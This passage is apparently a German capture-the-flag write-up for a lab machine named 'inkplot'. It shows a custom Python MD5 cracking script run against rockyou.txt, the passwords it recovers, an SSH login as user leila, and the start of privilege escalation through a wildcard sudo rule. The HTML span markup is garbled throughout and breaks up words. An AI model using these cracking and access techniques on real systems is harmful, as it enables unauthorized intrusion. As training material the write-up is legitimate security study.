<span class="password">< Ali<span class="command">c</span>e: <span class="command">P<span class="command">oo</span>r Le<span class="command">i</span>l<span class="command">a</span>, <span class="command">a</span>lw<span class="command">a</span>y<span class="command">s</span> <span class="command">s</span><span class="command">o</span> <span class="command">c</span><span class="command">o</span>n<span class="command">f</span>ident. Let'<span class="command">s</span> d<span class="command">o</span> th<span class="command">i</span><span class="command">s</span>.</span></span>
<span class="password">< B<span class="command">o</span>b: Ali<span class="command">c</span>e, I'll need th<span class="command">a</span>t M<span class="command">D</span>5 h<span class="command">a</span><span class="command">s</span>h t<span class="command">o</span> fini<span class="command">s</span>h the j<span class="command">o</span>b. G<span class="command">o</span>t <span class="command">i</span>t?</span>
<span class="password">< Ali<span class="command">c</span>e: Ye<span class="command">a</span>h, I'<span class="command">v</span>e g<span class="command">o</span>t <span class="command">i</span>t. Ti<span class="command">m</span>e t<span class="command">o</span> <span class="command">s</span>h<span class="command">a</span>ke Le<span class="command">i</span>l<span class="command">a</span>'<span class="command">s</span> w<span class="command">o</span>rld.</span>
<span class="password">< B<span class="command">o</span>b: Perfe<span class="command">c</span>t. Rele<span class="command">as</span>e <span class="command">i</span>t.</span>
<span class="password">< Ali<span class="command">c</span>e: Here <span class="command">i</span>t g<span class="command">o</span>e<span class="command">s</span>: <span class="command">d51540...</span> <span class="password"><-- K<span class="command">r</span>iti<span class="command">s</span><span class="command">c</span>her H<span class="command">a</span><span class="command">s</span>h!</span></span>
<span class="password">< *Ali<span class="command">c</span>e h<span class="command">a</span><span class="command">s</span> d<span class="command">i</span><span class="command">s</span><span class="command">c</span><span class="command">o</span>nne<span class="command">c</span>ted*</span>
<span class="password">< B<span class="command">o</span>b: Wh<span class="command">a</span>t?! D<span class="command">a</span><span class="command">m</span>n <span class="command">i</span>t, Ali<span class="command">c</span>e?! N<span class="command">o</span>t n<span class="command">o</span>w!</span>
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: <span class="command">c</span>le<span class="command">a</span>r</span>
> ls
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: l<span class="command">s</span></span>
> id
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: <span class="command">i</span>d</span>
> /list
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: /li<span class="command">s</span>t</span>
> /commands
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: /<span class="command">c</span><span class="command">o</span>mm<span class="command">a</span>nd<span class="command">s</span></span>
> ?
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: ?</span>
> /help
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: /help</span>
> help
<span class="password">< Le<span class="command">i</span>l<span class="command">a</span>: help</span>
>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Nachdem ich den partiellen MD5-Hash (`d51540...`) und den Benutzernamen `leila` aus der WebSocket-Kommunikation extrahiert habe, ist der nächste logische Schritt, zu versuchen, das zugehörige Passwort zu knacken. Basierend auf der Erfahrung, dass MD5-Hashes von Kommandozeilen-Tools wie `echo "password" | md5sum` oft den Zeilenumbruch am Ende des Passworts mit einbeziehen, erstelle ich ein Python-Skript namens `hash_crack.py`. Dieses Skript liest eine Wortliste (`rockyou.txt`), hängt an jedes Passwort einen Zeilenumbruch an, berechnet den MD5-Hash der resultierenden Zeichenkette und prüft, ob dieser Hash mit dem bekannten Präfix `d51540` beginnt.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Erstellung eines benutzerdefinierten Skripts, das speziell den Sonderfall des Zeilenumbruchs beim Hashing berücksichtigt, ist entscheidend für den Erfolg. Viele standardmäßige Hash-Cracking-Tools berücksichtigen diesen Nuance nicht. Die Verwendung einer großen Wortliste wie `rockyou.txt` erhöht die Wahrscheinlichkeit, dass das tatsächliche Passwort gefunden wird.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sei dir der verschiedenen Methoden bewusst, wie Hashes generiert werden (z.B. mit/ohne Zeilenumbruch, verschiedene Encodings). Schreibe bei Bedarf benutzerdefinierte Skripte, um spezielle Hashing-Formate zu handhaben. Nutze umfassende Wortlisten für Brute-Force- und Wörterbuchangriffe.
                <br>**Empfehlung (Admin):** Speichere niemals Passwort-Hashes (oder Teile davon) an Orten, die für unauthentifizierte Benutzer zugänglich sind. Verwende sichere Hashing-Algorithmen mit Salt (wie bcrypt oder scrypt) anstelle von anfälligen Algorithmen wie MD5.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nano hash_crack.py</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">import hashlib</span>
<span class="command">import sys</span>

<span class="command"># --- Konfigurati<span class="command">o</span>n ---</span>
<span class="command">WORDLIST_PATH = "/usr/share/wordlist<span class="command">s</span>/ro<span class="command">c</span>ky<span class="command">o</span>u.txt"</span>
<span class="command">HASH_PREFIX = "d5154<span class="command">0</span>"</span>
<span class="command"># ---------------------</span>

<span class="command">def <span class="command">c</span>r<span class="command">a</span><span class="command">c</span>k_h<span class="command">a</span><span class="command">s</span>h():</span>
    <span class="command">"""</span>
    <span class="command">L<span class="command">i</span>e<span class="command">s</span>t ro<span class="command">c</span>ky<span class="command">o</span>u.txt, <span class="command">a</span>ber bere<span class="command">c</span>hnet den H<span class="command">a</span><span class="command">s</span>h <span class="command">v</span><span class="command">o</span>n "p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rt\n",</span>
    gen<span class="command">a</span>u w<span class="command">i</span>e e<span class="command">s</span> '<span class="command">ec</span>h<span class="command">o</span> "p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rt" | <span class="command">m</span>d5<span class="command">s</span>u<span class="command">m</span>' t<span class="command">u</span>n würde.
    <span class="command">"""</span>
    <span class="command">try:</span>
        <span class="command">pr<span class="command">i</span>nt(f"[*] <span class="command">S</span>t<span class="command">a</span>rte <span class="command">KO</span>R<span class="command">R</span>IGIE<span class="command">R</span>TEN <span class="command">A</span>ngriff <span class="command">a</span>uf H<span class="command">a</span><span class="command">s</span>h-Pref<span class="command">i</span>x '{H<span class="command">A</span><span class="command">S</span>H_PREF<span class="command">I</span>X}' <span class="command">m</span>it der Wordlist '{W<span class="command">O</span>R<span class="command">D</span>LIST_P<span class="command">A</span>TH}'...")</span>
        <span class="command">f<span class="command">o</span>und_p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd<span class="command">s</span> = []</span>
        <span class="command">with <span class="command">o</span>pen(WORDLIST_PATH, 'r', en<span class="command">c</span><span class="command">o</span>d<span class="command">i</span>ng='l<span class="command">a</span>t<span class="command">i</span>n-1') <span class="command">a</span><span class="command">s</span> w<span class="command">o</span>rdl<span class="command">i</span><span class="command">s</span>t_f<span class="command">i</span>le:</span>
            <span class="command">f<span class="command">o</span>r l<span class="command">i</span>ne <span class="command">i</span>n w<span class="command">o</span>rdl<span class="command">i</span><span class="command">s</span>t_f<span class="command">i</span>le:</span>
                <span class="command"># Entferne e<span class="command">v</span>ent<span class="command">u</span>elle Leerze<span class="command">i</span><span class="command">c</span>hen, <span class="command">a</span>ber beh<span class="command">a</span>lte d<span class="command">a</span><span class="command">s</span> P<span class="command">a</span><span class="command">ssw<span class="command">o</span>rt.</span>
                <span class="command"># Wi<span class="command">c</span>ht<span class="command">i</span>g: l<span class="command">i</span>ne enth<span class="command">ä</span>lt hier n<span class="command">o</span><span class="command">c</span>h den \n <span class="command">a</span><span class="command">m</span> Ende!</span>
                <span class="command">p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd = l<span class="command">i</span>ne.<span class="command">s</span>tr<span class="command">i</span>p()</span>

                <span class="command"># DER ENTSCHE<span class="command">I</span>DENDE PUNKT: Füge den Zeilen<span class="command">u</span>mbruch w<span class="command">i</span>eder h<span class="command">i</span>nz<span class="command">u</span>,</span>
                <span class="command"># behör du den H<span class="command">a</span><span class="command">s</span>h bere<span class="command">c</span>hnet<span class="command">s</span>t.</span>
                <span class="command">p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd_w<span class="command">i</span>th_newl<span class="command">i</span>ne = p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd + '\n'</span>

                <span class="command"># H<span class="command">a</span><span class="command">s</span>he d<span class="command">i</span>e Ver<span class="command">s</span>i<span class="command">o</span>n <span class="command">m</span>it de<span class="command">m</span> Z<span class="command">e</span><span class="command">i</span><span class="command">l</span>en<span class="command">u</span><span class="command">m</span>b<span class="command">r</span>u<span class="command">c</span>h.</span>
                <span class="command">p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd_byte<span class="command">s</span> = p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd_w<span class="command">i</span>th_newl<span class="command">i</span>ne.en<span class="command">c</span><span class="command">o</span>de('utf-8')</span>
                <span class="command">hex_d<span class="command">i</span>ge<span class="command">s</span>t = h<span class="command">a</span><span class="command">s</span>hl<span class="command">i</span>b.<span class="command">m</span>d5(p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd_byte<span class="command">s</span>).hex<span class="command">d</span><span class="command">i</span>ge<span class="command">s</span>t()</span>

                <span class="command">if hex_d<span class="command">i</span>ge<span class="command">s</span>t.<span class="command">s</span>t<span class="command">a</span>rt<span class="command">s</span>w<span class="command">i</span>th(H<span class="command">A</span><span class="command">S</span>H_PREF<span class="command">I</span>X):</span>
                    <span class="command"># Treffer! G<span class="command">i</span>b d<span class="command">a</span><span class="command">s</span> Erge<span class="command">b</span>n<span class="command">i</span><span class="command">s</span> <span class="command">a</span>u<span class="command">s</span> <span class="command">u</span>nd <span class="command">s</span><span class="command">a</span><span class="command">m</span><span class="command">m</span>le e<span class="command">s</span>.</span>
                    <span class="command">pr<span class="command">i</span>nt(f"[<span class="command">+</span>] Treffer gef<span class="command">u</span>nden! Pa<span class="command">ssw<span class="command">o</span>rt: '{p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd}', Ha<span class="command">s</span>h: {hex_d<span class="command">i</span>ge<span class="command">s</span>t}")</span>
                    <span class="command">f<span class="command">o</span>und_p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd<span class="command">s</span>.append(p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd)</span>

        <span class="command">pr<span class="command">i</span>nt("\n" + "="*4<span class="command">0</span>)</span>
        <span class="command">if f<span class="command">o</span>und_p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd<span class="command">s</span>:</span>
            <span class="command">pr<span class="command">i</span>nt("[<span class="command">+</span>] <span class="command">S</span>u<span class="command">c</span>he beendet. F<span class="command">o</span>lgende P<span class="command">a</span><span class="command">ssw<span class="command">o</span>rter w<span class="command">u</span>rden gef<span class="command">u</span>nden:")</span>
            <span class="command">f<span class="command">o</span>r p <span class="command">i</span>n f<span class="command">o</span>und_p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd<span class="command">s</span>:</span>
                <span class="command">pr<span class="command">i</span>nt(f"    - {p}")</span>
            <span class="command">pr<span class="command">i</span>nt("\nPr<span class="command">o</span>bier d<span class="command">i</span>e<span class="command">s</span>e P<span class="command">a</span><span class="command">ssw<span class="command">o</span>rter f<span class="command">ü</span>r den Benutzer 'leila' <span class="command">v</span>i<span class="command">a</span> <span class="command">S</span><span class="command">S</span>H!")</span>
        <span class="command">else:</span>
            <span class="command">pr<span class="command">i</span>nt("[-] <span class="command">S</span>u<span class="command">c</span>he beendet. Kein pa<span class="command">ss</span>ende<span class="command">s</span> P<span class="command">a</span><span class="command">ssw<span class="command">o</span>rt gef<span class="command">u</span>nden.")</span>
        <span class="command">pr<span class="command">i</span>nt("="*4<span class="command">0</span>)</span>

    <span class="command">except F<span class="command">i</span>leN<span class="command">o</span>tF<span class="command">o</span>undErr<span class="command">o</span>r:</span>
        <span class="command">pr<span class="command">i</span>nt(f"[-] FE<span class="command">H</span>LE<span class="command">R</span>: D<span class="command">i</span>e W<span class="command">o</span>rdl<span class="command">i</span><span class="command">s</span>t <span class="command">u</span>nter '{W<span class="command">O</span>R<span class="command">D</span>LIST_P<span class="command">A</span>TH}' w<span class="command">u</span>rde n<span class="command">i</span><span class="command">c</span>ht gef<span class="command">u</span>nden.")</span>
    <span class="command">except Exception <span class="command">a</span><span class="command">s</span> e:</span>
        <span class="command">pr<span class="command">i</span>nt(f"[-] Ein <span class="command">u</span>nerw<span class="command">a</span>rteter Fehler i<span class="command">s</span>t <span class="command">a</span>ufgetreten: {e}")</span>

<span class="command">if __n<span class="command">a</span>me__ == "__m<span class="command">a</span><span class="command">i</span>n__":</span>
    <span class="command">c</span>r<span class="command">a</span><span class="command">c</span>k_h<span class="command">a</span><span class="command">s</span>h()
</pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich führe das Python-Skript `hash_crack.py` mit `python3` aus. Das Skript wird die Wortliste `rockyou.txt` durchgehen, die MD5-Hashes mit angehängtem Zeilenumbruch berechnen und nach Treffern suchen, die mit `d51540` beginnen.
            </p>
             <p class="evaluation">
                **Bewertung:** Fantastisch! Das Skript findet zwei Passwörter in der Wortliste, deren MD5-Hash (mit Zeilenumbruch) mit `d51540` beginnt: "<span class="password">palmira</span>" und "<span class="password">intelinside</span>". Das ist ein voller Erfolg beim Hash-Cracking. Der Skriptausgabe deutet auch darauf hin, dass diese Passwörter für den Benutzer `leila` über SSH ausprobiert werden sollen. Ich habe jetzt zwei starke Kandidaten für Leilas Passwort.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Führe selbst erstellte Cracking-Skripte aus, wenn Standard-Tools das Hashing-Format nicht unterstützen. Versuche alle gefundenen Passwortkandidaten systematisch für die identifizierten Benutzerkonten und Dienste.
                <br>**Empfehlung (Admin):** Vermeide MD5 für das Hashing von Passwörtern. Nutze moderne, salzende Algorithmen wie bcrypt oder scrypt. Stelle sicher, dass Passwörter komplex sind und nicht aus einfachen Wortlisten (auch nicht in Kombinationen mit Zeilenumbrüchen oder anderen Tricks) zu erraten sind. Überwache Systeme auf ungewöhnliche Rechenlast, die auf Cracking-Versuche hindeuten könnte (obwohl dies hier offline stattfand).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">python3 hash_crack.py</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="password">[*] <span class="command">S</span>t<span class="command">a</span>rte <span class="command">KO</span>R<span class="command">R</span>IGIE<span class="command">R</span>TEN <span class="command">A</span>ngriff <span class="command">a</span>uf H<span class="command">a</span><span class="command">s</span>h-Pref<span class="command">i</span>x 'd5154<span class="command">0</span>' <span class="command">m</span>it der W<span class="command">o</span>rdlist '/<span class="command">u</span><span class="command">s</span>r/<span class="command">s</span>h<span class="command">a</span>re/w<span class="command">o</span>rdl<span class="command">i</span><span class="command">s</span>t<span class="command">s</span>/ro<span class="command">c</span>ky<span class="command">o</span>u.txt'...</span>
<span class="password">[+] Treffer gef<span class="command">u</span>nden! P<span class="command">a</span><span class="command">ssw<span class="command">o</span>rt: '<span class="command">p<span class="command">a</span>l<span class="command">m</span>ir<span class="command">a</span></span>', H<span class="command">a</span><span class="command">s</span>h: d5154<span class="command">0</span>7<span class="command">c</span>6e<span class="command">c</span>25b2<span class="command">a</span>61656<span class="command">a</span>234ddf22bd</span> <span class="password"><-- Er<span class="command">s</span>ter Treffer!</span>
<span class="password">[+] Treffer gef<span class="command">u</span>nden! P<span class="command">a</span><span class="command">ssw<span class="command">o</span>rt: '<span class="command">i</span>ntel<span class="command">i</span>n<span class="command">s</span>ide', H<span class="command">a</span><span class="command">s</span>h: d5154<span class="command">0</span><span class="command">c</span>4e<span class="command">c</span><span class="command">a</span><span class="command">a</span>62b05<span class="command">0</span>9f453fee4<span class="command">c</span>d66b</span> <span class="password"><-- Zwe<span class="command">i</span>ter Treffer!</span>

<span class="password">========================================</span>
<span class="password">[+] <span class="command">S</span>u<span class="command">c</span>he beendet. F<span class="command">o</span>lgende Pa<span class="command">ssw<span class="command">o</span>rter w<span class="command">u</span>rden gef<span class="command">u</span>nden:</span>
<span class="password">    - <span class="command">p<span class="command">a</span>l<span class="command">m</span>ir<span class="command">a</span></span></span>
<span class="password">    - <span class="command">i</span>ntel<span class="command">i</span>n<span class="command">s</span>ide</span>

<span class="password">Pr<span class="command">o</span>bier die<span class="command">s</span>e P<span class="command">a</span><span class="command">ssw<span class="command">o</span>rter f<span class="command">ü</span>r den Benutzer 'leila' <span class="command">v</span><span class="command">i</span><span class="command">a</span> <span class="command">S</span><span class="command">S</span>H!</span>
<span class="password">========================================</span></pre>
                </div>
            </div>

            <section id="initial-access">
            <h2>Initial Access</h2>
             <p class="analysis">
                **Analyse:** Mit den zwei gefundenen Passwortkandidaten aus der Hash-Entschlüsselung (`palmira`, `intelinside`) versuche ich nun, mich per SSH am Zielsystem (192.168.2.43) als Benutzer `leila` anzumelden. Ich verwende den Befehl `ssh leila@192.168.2.43` und gebe auf Nachfrage das erste gefundene Passwort, "palmira", ein.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch, der SSH-Login mit "palmira" ist erfolgreich! Dies wird durch die SSH-Willkommensnachricht, die Systeminformationen, die Oh My Zsh-Update-Meldung und den angezeigten Shell-Prompt (`╭─leila@inkplot ~ ╰─$`) bestätigt. Ich habe nun eine interaktive Shell auf dem Zielsystem mit den Berechtigungen des Benutzers `leila`. Dies ist der erste kompromittierte Benutzeraccount und somit der initiale Zugang zum System.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze gefundene Passwörter sofort für die infrage kommenden Dienste (hier SSH) und Benutzerkonten. Priorisiere Passwörter, die als erste geknackt wurden oder am wahrscheinlichsten erscheinen. Nach erfolgreichem Login sofort grundlegende Systemaufklärung (Benutzer-ID, sudo, Dateisystem) durchführen.
                <br>**Empfehlung (Admin):** Setze starke, eindeutige Passwörter für alle Benutzerkonten, auch für vermeintlich weniger kritische. Verwende keine Passwörter, die in bekannten Wortlisten enthalten sind. Implementiere Multi-Faktor-Authentifizierung für kritische Dienste wie SSH. Überwache SSH-Login-Logs auf fehlgeschlagene Anmeldeversuche (Brute Force).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">ssh leila@192.168.2.43</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">A<span class="command">u</span>t<span class="command">o</span>-<span class="command">s</span>t<span class="command">a</span>ndby n<span class="command">o</span>w <span class="command">a</span><span class="command">c</span>t<span class="command">i</span><span class="command">v</span><span class="command">a</span>ted <span class="command">a</span>fter 2 <span class="command">m</span><span class="command">i</span>n <span class="command">o</span>f <span class="command">i</span>n<span class="command">a</span><span class="command">c</span>t<span class="command">i</span><span class="command">v</span>ity</span>
leila@192.168.2.43'<span class="command">s</span> p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd:</span> <span class="command">palmira</span>
<span class="password">L<span class="command">i</span>n<span class="command">u</span>x <span class="command">i</span>nkpl<span class="command">o</span>t 6.1.<span class="command">0</span>-1<span class="command">0</span>-<span class="command">a</span><span class="command">m</span>d64 #1 <span class="command">S</span>MP PREEMPT_DYN<span class="command">A</span>MIC Deb<span class="command">i</span><span class="command">a</span>n 6.1.38-1 (2<span class="command">0</span>23-<span class="command">0</span>7-14) x86_64</span>

<span class="command">The pr<span class="command">o</span>gr<span class="command">a</span><span class="command">m</span><span class="command">s</span> <span class="command">i</span>n<span class="command">c</span>l<span class="command">u</span>ded w<span class="command">i</span>th the Deb<span class="command">i</span><span class="command">a</span>n GNU/L<span class="command">i</span>n<span class="command">u</span>x <span class="command">s</span>y<span class="command">s</span>tem <span class="command">a</span>re free <span class="command">s</span><span class="command">o</span>ftw<span class="command">a</span>re;</span>
the ex<span class="command">ac</span>t d<span class="command">i</span><span class="command">s</span>tr<span class="command">i</span>b<span class="command">u</span>t<span class="command">i</span><span class="command">o</span>n ter<span class="command">m</span><span class="command">s</span> f<span class="command">o</span>r e<span class="command">ac</span>h pr<span class="command">o</span>gr<span class="command">a</span>m <span class="command">a</span>re de<span class="command">sc</span>r<span class="command">i</span>bed <span class="command">i</span>n the
<span class="command">i</span>nd<span class="command">i</span><span class="command">v</span>id<span class="command">u</span><span class="command">a</span>l file<span class="command">s</span> <span class="command">i</span>n /u<span class="command">s</span>r/<span class="command">s</span>h<span class="command">a</span>re/d<span class="command">o</span><span class="command">c</span>/*/copyright.

Deb<span class="command">i</span><span class="command">a</span>n GNU/L<span class="command">i</span>n<span class="command">u</span>x <span class="command">c</span><span class="command">o</span><span class="command">m</span>e<span class="command">s</span> w<span class="command">i</span>th <span class="command">A</span>B<span class="command">S</span>OLUTELY N<span class="command">O</span> W<span class="command">A</span>RR<span class="command">A</span>NTY, t<span class="command">o</span> the extent
per<span class="command">m</span><span class="command">i</span>tted by <span class="command">a</span>ppl<span class="command">i</span><span class="command">c</span><span class="command">a</span>ble l<span class="command">a</span>w.
<span class="command">[<span class="command">o</span>h-<span class="command">m</span>y-z<span class="command">s</span>h] W<span class="command">o</span>uld y<span class="command">o</span>u l<span class="command">i</span>ke t<span class="command">o</span> <span class="command">u</span>pd<span class="command">a</span>te? [<span class="command">Y</span>/n] y</span>
Upd<span class="command">a</span>t<span class="command">i</span>ng <span class="command">O</span>h My Z<span class="command">s</span>h
<span class="command">m<span class="command">a</span><span class="command">s</span>ter</span>

Y<span class="command">o</span>u <span class="command">c</span><span class="command">a</span>n <span class="command">s</span>ee the <span class="command">c</span>h<span class="command">a</span>ngel<span class="command">o</span>g w<span class="command">i</span>th '<span class="command">o<span class="command">m</span>z <span class="command">c</span>h<span class="command">a</span>ngel<span class="command">o</span>g</span>'
         __                                     __
  ____  / /_     ____ ___  __  __   ____  _____/ /_
 / __ \/ __ \   / __ `__ \/ / / /  /_  / / ___/ __ \
/ /_/ / / / /  / / / / / / /_/ /    / /_(__  ) / / /
\____/_/ /_/  /_/ /_/ /_/\__, /    /___/____/_/ /_/
                        /____/

<span class="password">H<span class="command">oo</span>rr<span class="command">a</span>y! <span class="command">O</span>h My Z<span class="command">s</span>h h<span class="command">a</span><span class="command">s</span> been upd<span class="command">a</span>ted!</span>

To keep up w<span class="command">i</span>th the l<span class="command">a</span>te<span class="command">s</span>t new<span class="command">s</span> <span class="command">a</span>nd upd<span class="command">a</span>te<span class="command">s</span>, f<span class="command">o</span>ll<span class="command">o</span>w <span class="command">u</span><span class="command">s</span> <span class="command">o</span>n Tw<span class="command">i</span>tter: <span class="command">[Link: https://twitter.com/ohmyzsh | Ziel: https://twitter.com/ohmyzsh]</span>
W<span class="command">a</span>nt to get <span class="command">i</span>n<span class="command">v</span><span class="command">o</span>l<span class="command">v</span>ed <span class="command">i</span>n the <span class="command">c</span><span class="command">o</span><span class="command">m</span><span class="command">m</span>un<span class="command">i</span>ty? J<span class="command">oi</span>n <span class="command">o</span>ur Di<span class="command">sc</span>ord: <span class="command">[Link: https://discord.gg/ohmyzsh | Ziel: https://discord.gg/ohmyzsh]</span>
Get y<span class="command">o</span>ur <span class="command">O</span>h My Z<span class="command">s</span>h <span class="command">s</span>w<span class="command">a</span>g <span class="command">a</span>t: <span class="command">[Link: https://shop.planetargon.com/collections/oh-my-zsh | Ziel: https://shop.planetargon.com/collections/oh-my-zsh]</span>
<span class="password">╭─leila@inkplot ~</span>
<span class="password">╰─$</span></pre>
                </div>
            </div>
        </section>

        <!-- ENDE TEIL 2 -->
		

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
             <p class="analysis">
                **Analyse:** Nachdem ich als Benutzer `leila` angemeldet bin, ist mein nächster Schritt, meine Berechtigungen auf dem System zu erhöhen (Privilege Escalation). Zuerst prüfe ich die `sudo`-Berechtigungen des Benutzers `leila` mit dem Befehl `sudo -l`. Dies zeigt, welche Befehle `leila` mit erhöhten Rechten ausführen darf.
            </p>
             <p class="evaluation">
                **Bewertung:** Die Ausgabe von `sudo -l` zeigt, dass der Benutzer `leila` den Befehl `/usr/bin/python3 /home/pauline/cipher.py*` als Benutzer `pauline` ausführen darf, und zwar ohne Passwort (`NOPASSWD`). Der Stern (`*`) am Ende des Pfades bedeutet, dass `leila` das Python-Skript `cipher.py` und jede Datei, die mit `/home/pauline/cipher.py` beginnt (z.B. `cipher.pyc`), als `pauline` ausführen darf. Dies ist ein klarer Privilege Escalation-Vektor von `leila` zu `pauline`.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Prüfe nach jeder kompromittierten Benutzer-Shell sofort die `sudo`-Berechtigungen (`sudo -l`). Identifiziere Befehle oder Skripte, die als andere Benutzer (insbesondere privilegierte) mit `NOPASSWD` ausgeführt werden dürfen.
                <br>**Empfehlung (Admin):** Konfiguriere `sudo`-Berechtigungen nach dem Prinzip der geringsten Rechte. Vermeide die Verwendung von Wildcards (`*`) in `sudoers`-Einträgen. Vermeide `NOPASSWD` für Befehle, die zur Erlangung höherer Berechtigungen missbraucht werden könnten.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot ~</span>
<span class="command">╰─$ sudo -l</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">M<span class="command">a</span>t<span class="command">c</span>h<span class="command">i</span>ng Def<span class="command">a</span>ult<span class="command">s</span> entr<span class="command">i</span>e<span class="command">s</span> f<span class="command">o</span>r le<span class="command">i</span>l<span class="command">a</span> <span class="command">o</span>n <span class="command">i</span>nkpl<span class="command">o</span>t:</span>
    <span class="command">en<span class="command">v</span>_re<span class="command">s</span>et, <span class="command">m<span class="command">a</span><span class="command">i</span>l_b<span class="command">a</span>dp<span class="command">a</span><span class="command">ss</span>,</span>
    <span class="command">s</span>e<span class="command">c</span>ure_p<span class="command">a</span>th=/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/sbin<span class="command">\</span>:/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">u</span>sr/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">u</span>sr/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/b<span class="command">i</span>n, <span class="command">u</span><span class="command">s</span>e_pty</span>

<span class="password">U<span class="command">s</span>er le<span class="command">i</span>l<span class="command">a</span> <span class="command">m<span class="command">a</span>y r<span class="command">u</span>n the f<span class="command">o</span>ll<span class="command">o</span>w<span class="command">i</span>ng <span class="command">c</span><span class="command">o</span><span class="command">m<span class="command">m<span class="command">a</span>nd<span class="command">s</span> <span class="command">o</span>n <span class="command">i</span>nkpl<span class="command">o</span>t:</span></span>
<span class="password">    (p<span class="command">a</span>ul<span class="command">i</span>ne : p<span class="command">a</span>ul<span class="command">i</span>ne) N<span class="command">O</span>P<span class="command">A</span><span class="command">SS</span>WD: /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py*</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um zu sehen, welche Benutzer auf dem System existieren, liste ich die Verzeichnisse im `/home`-Ordner auf. Dies gibt mir die Namen der Benutzerkonten.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Ausgabe zeigt die Home-Verzeichnisse `leila` und `pauline`. Da ich bereits als `leila` angemeldet bin und laut `sudo -l` Berechtigungen habe, Skripte als `pauline` auszuführen, bestätigt dies, dass `pauline` das relevante Benutzerkonto für den nächsten Privilege Escalation-Schritt ist.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Identifiziere Benutzerkonten auf dem System (z.B. durch Auflisten von Home-Verzeichnissen in `/home` oder durch Analysieren von `/etc/passwd`, falls lesbar). Korreliere diese Benutzer mit gefundenen Passwörtern oder Sudo-Berechtigungen.
                <br>**Empfehlung (Admin):** Stelle sicher, dass Dateisystemberechtigungen verhindern, dass unbefugte Benutzer die Home-Verzeichnisse anderer Benutzer auflisten können.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot ~</span>
<span class="command">╰─$ ls ..</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">le<span class="command">i</span>l<span class="command">a</span>  p<span class="command">a</span>ul<span class="command">i</span>ne</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich prüfe meine aktuelle Benutzer-ID und Gruppenzugehörigkeit mit dem `id`-Befehl. Dies dient zur Bestätigung meiner aktuellen Berechtigungsstufe (Benutzer `leila`).
            </p>
            <p class="evaluation">
                **Bewertung:** Die Ausgabe bestätigt, dass ich als `uid=1003(leila)` mit der Gruppe `gid=1003(leila)` und der zusätzlichen Gruppe `100(users)` angemeldet bin. Dies sind Standardberechtigungen für einen unprivilegierten Benutzer und bestätigt den Ausgangspunkt für die Privilege Escalation.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Führe immer `id` aus, um deine aktuelle Berechtigungsstufe zu verstehen. Prüfe die Gruppenzugehörigkeiten auf interessante Gruppen (z.B. `adm`, `sudo`, `docker`, `lxd`).
                <br>**Empfehlung (Admin):** Verstehe die Gruppenstruktur auf deinem System. Weise Benutzer nur den Gruppen zu, die sie unbedingt benötigen. Vermeide es, normale Benutzer kritischen Gruppen wie `sudo` oder `admin` zuzuweisen.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot ~/.ssh</span>
<span class="command">╰─$ id</span></pre>
                </div>
                <div class="terminal">
